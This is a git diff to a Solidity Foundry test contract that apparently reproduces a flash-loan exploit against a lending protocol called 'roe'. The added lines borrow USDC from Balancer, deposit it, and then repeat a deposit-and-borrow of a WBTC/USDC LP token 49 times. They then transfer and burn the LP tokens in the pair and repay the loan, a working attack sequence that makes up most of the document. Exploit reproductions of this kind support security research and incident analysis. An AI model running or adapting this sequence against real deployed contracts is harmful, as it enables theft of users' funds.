@@ -61,9 +61,11 @@ contract ContractTest is Test {
         uint256[] memory amounts = new uint256[](1);
         amounts[0] = flashLoanAmount;
         bytes memory userData = "";
-        console.log(" ~ borrowAmount:", USDC.balanceOf(address(this)));
+        console2.log(" ~ USDC before:", USDC.balanceOf(address(this)));
+        console2.log("flashLoan: ", address(this), tokens[0], amounts[0]);
+
         balancer.flashLoan(address(this), tokens, amounts, userData);
-        console.log(" ~ borrowAmount2 :", USDC.balanceOf(address(this)));
+        console2.log(" ~ USDC after :", USDC.balanceOf(address(this)));
     }
 
     function receiveFlashLoan(
@@ -73,6 +75,18 @@ contract ContractTest is Test {
         bytes memory userData
     ) external {
         uint256 borrowAmount = Pair.balanceOf(roeWBTC_USDC_LP);
-        console.log(" ~ borrowAmount:", borrowAmount);
+        console2.log(" ~ borrowAmount:", borrowAmount);
+        USDC.approve(address(roe), type(uint256).max);
+        Pair.approve(address(roe), type(uint256).max);
+        roe.deposit(address(USDC), USDC.balanceOf(address(this)), tx.origin, 0);
+        roe.borrow(address(Pair), borrowAmount, 2, 0, tx.origin);
+        for (uint256 i; i < 49; ++i) {
+            roe.deposit(address(Pair), borrowAmount, address(this), 0);
+            roe.borrow(address(Pair), borrowAmount, 2, 0, tx.origin);
+        }
+        Pair.transfer(address(Pair), borrowAmount);
+        Pair.burn(address(this));
+        USDC.transfer(address(Pair), 26_025 * 1e6);
+        
     }
 }
